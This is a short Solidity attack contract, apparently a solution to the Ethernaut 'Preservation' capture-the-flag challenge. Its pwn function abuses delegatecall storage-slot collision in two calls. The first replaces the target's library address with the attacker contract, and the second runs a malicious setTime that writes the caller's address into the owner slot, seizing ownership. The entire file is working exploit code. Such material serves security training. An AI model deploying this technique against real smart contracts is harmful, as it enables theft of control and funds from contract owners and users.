// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint256 _timestamp) external;
}

contract PreservationAttack {
    IPreservation target;
    uint256 slotOne;
    address owner;

    constructor(address _target) {
        target = IPreservation(_target);
    }

    function pwn() external {
        // timeZone1Library points to PreservationAttack
        target.setFirstTime(uint256(uint160(address(this))));

        // Invoke PreservationAttack's setTime function
        target.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
